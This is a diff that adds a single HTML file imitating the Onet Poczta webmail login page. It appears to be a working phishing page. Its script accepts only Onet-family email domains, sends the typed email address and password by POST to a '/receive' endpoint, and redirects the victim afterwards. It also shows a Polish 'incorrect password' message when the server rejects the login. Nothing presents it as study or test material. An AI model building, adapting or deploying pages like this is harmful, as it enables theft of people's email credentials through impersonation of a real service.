@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poczta Onet - Secure Login</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 360px;
+            width: 100%;
+            padding: 20px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            background-color: #fff;
+            margin-top: 0;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            height: 40px;
+            margin-right: 10px;
+        }
+
+        h1 {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        p {
+            margin: 0 0 20px;
+            color: #666;
+        }
+
+        label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #333;
+            margin-left: 5%;
+        }
+
+        input {
+            width: 90%; 
+            padding: 9px; 
+            margin-bottom: 2px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .button {
+            display: inline-block;
+            width: 90%;
+            padding: 10px;
+            background-color: #ffd400;
+            border: none;
+            border-radius: 15px;
+            font-size: 14px; 
+            font-weight: bold;
+            color: #000;
+            text-align: center;
+            cursor: pointer;
+            margin-top: 4%;
+            text-decoration: none; 
+        }
+
+        .button:hover {
+            background-color: #e6be00;
+        }
+
+        .links {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: #0073e6;
+            margin-left:6%;
+        }
+
+        .links a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #ddd;
+            margin: 0 10px;
+        }
+
+        .ad {
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .signup-button {
+            display: inline-block;
+            width: 80%;
+            padding: 10px;
+            background-color: #fff;
+            color: #000;
+            border: 1px solid #ccc;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            cursor: pointer;
+            text-decoration: none;
+            margin-top: 10px; 
+        }
+
+        .signup-button:hover {
+            background-color: #f5f5f5;
+        }
+        
+        form {
+        margin-top:20%;   
+        }
+        
+        @media( max-width: 785px){
+        .container {
+        height:100vh;
+        }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="OnetPoczta.png" alt="Onet Logo">
+        </div>
+        <h1>Poczta Onet - secure login</h1>
+        <p>with your Onet account</p>
+        <form id="formLogin">
+        	<div>
+            <label for="email">E-mail address</label>
+            <input style="background-color: #eee;" type="email" id="email" placeholder="" required>
+           </div>
+           <div style="margin-top:18px;">
+           <label for="email">Password</label>
+            <input style="background-color: #eee;" type="password" id="password" placeholder="" required>
+     		</div> 
+            		
+            	<button type="submit" id="login-button" class="button">NEXT</button>
+        </form> 
+        <div class="links">
+            <a href="#">Forgot password</a>
+        </div>
+        <div class="divider">YOU DO NOT HAVE ACCOUNT YET?</div>
+        <a href="#" class="signup-button">Sign up</a>
+        <div class="ad">AD</div>
+    </div>
+</body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  
+    <script>
+$(document).ready(function () {
+    function validateInputs(formId) {
+        const form = $(`#${formId}`);
+        const emailInput = form.find("#email");
+        const passwordInput = form.find("#password");
+
+        const emailValue = emailInput.val().trim();
+        const passwordValue = passwordInput.val().trim();
+
+        const allowedDomains = [
+            "onet.pl", "op.pl", "poczta.onet.pl", "vp.pl",
+            "spoko.pl", "autograf.pl", "onet.eu", "onet.com.pl"
+        ];
+
+        const emailRegex = /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?([a-zA-Z]{2,})$/;
+
+        let isValid = true;
+
+        // Email validation
+        if (emailValue && emailRegex.test(emailValue)) {
+            const domain = emailValue.split("@")[1];
+            if (!allowedDomains.includes(domain)) {
+                isValid = false;
+                emailInput.css("border", "2px solid red");
+                if (!form.find(".email-error").length) {
+                    emailInput.after('<div class="email-error" style="color: red; font-size:15px; text-align:left; margin-left:6%;">Konto nie znalezione</div>');
+                }
+            } else {
+                emailInput.css("border", "");
+                form.find(".email-error").remove();
+            }
+        } else {
+            isValid = false;
+            emailInput.css("border", "2px solid red");
+            if (!form.find(".email-error").length) {
+                emailInput.after('<div class="email-error" style="color: red; font-size:15px; text-align:left;">Konto nie znalezione</div>');
+            }
+        }
+
+        // Password validation
+        if (!passwordValue) {
+            isValid = false;
+            passwordInput.css("border", "2px solid red");
+            if (!form.find(".password-error").length) {
+                passwordInput.after('<div class="password-error" style="color: red; font-size:15px; text-align:left;">Hasło jest wymagane</div>');
+            }
+        } else {
+            passwordInput.css("border", "");
+            form.find(".password-error").remove();
+        }
+
+        return isValid;
+    }
+
+    function handleFormSubmission(formId, submitUrl) {
+        const form = document.querySelector(`#${formId}`);
+        const inputs = form.querySelectorAll('input');
+        const formData = {};
+
+        inputs.forEach(input => {
+            formData[input.id] = input.value;
+        });
+
+        console.log(formData);
+
+        $.ajax({
+            url: submitUrl,
+            type: "POST",
+            data: formData,
+            success: function (response) {
+                console.log(response); // Handle success
+                window.location.href = response.url;
+            },
+            error: function (error) {
+                if (error.status === 401) { // Incorrect password case
+                    const passwordInput = $(`#${formId} #password`);
+                    passwordInput.css("border", "2px solid red");
+                    if (!$(`#${formId} .password-error`).length) {
+                        passwordInput.after('<div class="password-error" style="color: red; font-size:15px; text-align:left;">Niepoprawne hasło</div>');
+                    }
+                } else {
+                    alert("An error occurred while submitting the form.");
+                    console.error(error); // Handle other errors
+                }
+            },
+        });
+    }
+
+    // Attach form submission handler
+    const formId = "formLogin";
+    const submitButtonId = "login-button";
+    const submitUrl = "/receive"; // Replace with your actual submission endpoint
+
+    $(`#${submitButtonId}`).on("click", function (e) {
+        e.preventDefault(); // Prevent default form submission
+
+        // Validate the form
+        const isValid = validateInputs(formId);
+
+        if (isValid) {
+            handleFormSubmission(formId, submitUrl);
+        }
+    });
+});
+</script>
+</html>
+ 
